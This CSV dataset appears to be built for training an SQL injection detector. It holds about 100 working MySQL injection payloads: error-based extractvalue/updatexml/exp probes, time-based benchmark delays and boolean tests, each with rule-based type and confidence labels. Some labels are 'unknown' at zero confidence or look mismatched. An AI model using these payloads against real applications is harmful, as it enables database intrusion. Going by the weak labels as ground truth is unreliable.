payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1"" ) as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) -- rlas",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( '%' = '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) -- wvjy",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1' ) ) as arhm where 3268 = 3268 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""xmvr"" = ""xmvr",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) as hoiv where 9708 = 9708 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) where 6340 = 6340 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""%"" = """,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'gfxr' = 'gfxr",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) ) as gcvw where 7363 = 7363 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"1 ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) as lrif where 6525 = 6525 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"1 ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1%"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""%"" = """,error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'skdm' = 'skdm",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( '%' = '",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""%"" = """,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) as fkco where 8877 = 8877 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'urxs' = 'urxs",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1', ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 9693 = 9693,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'txyy' where 6500 = 6500 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",error_based,mysql,case_variation|hex_string,0.44,rule,sqliv2_csv,unknown
"1%"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""%"" = """,error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1%' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( '%' = '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ""thkh"" like ""thkh",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) where 6236 = 6236 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1%"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""%"" = """,time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) as hlit where 4973 = 4973 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1%' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( '%' = '",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) where 6056 = 6056 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"-3873%' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'blie' = 'blie",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'pbin' = 'pbin",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"-5606 ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1'+ ( select ijck where 9961 = 9961 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +'",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'ymac' from dual where 9268 = 9268 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) ||'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""tbdl"" like ""tbdl",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'qpuy' = 'qpuy",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) # mafe",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'drvk' like 'drvk",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv2_csv,unknown
"1'+ ( select pxsd where 2576 = 2576 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) +'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""ubvd"" = ""ubvd",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""%"" = """,union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-4653' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""suxh"" = ""suxh",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # couj",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' where 3339 = 3339 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) as bsvk where 5985 = 5985 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'egnv' like 'egnv",time_blind,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" where 5353 = 5353 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-9180"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1'+ ( select mems where 5091 = 5091 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) # cqqs",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1'+ ( select 'otqy' where 2754 = 2754 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) +'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1 ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 3626 = 3626",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'qcsi' = 'qcsi",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 5776 = 5776",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) +'",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'mymg' = 'mymg",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1%"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""%"" = """,error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' where 5251 = 5251 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( ""jywy"" like ""jywy",error_based,mysql,case_variation|function_alternative|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) where 1093 = 1093 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1%' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and '%' = '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1%"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = """,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'ywxe' like 'ywxe",error_based,mysql,function_alternative|hex_string,0.44,rule,sqliv2_csv,unknown
"1 ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 8189 = 8189",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) as khkv where 2944 = 2944 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) ) as hqwy where 4433 = 4433 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""deeu"" like ""deeu",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1%' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and '%' = '",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'jvll' like 'jvll",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'ocfi' = 'ocfi",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'zeum' = 'zeum",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1%' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and '%' = '",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""nobt"" = ""nobt",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1%"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""%"" = """,union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'kqip' like 'kqip",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'yiem' = 'yiem",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""cgpm"" like ""cgpm",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1'+ ( select 'ples' where 4244 = 4244 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) +'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'inrm' like 'inrm",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"( select 2768 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 2768 = 2768,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1%' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( '%' = '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( 'yqhk' = 'yqhk",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
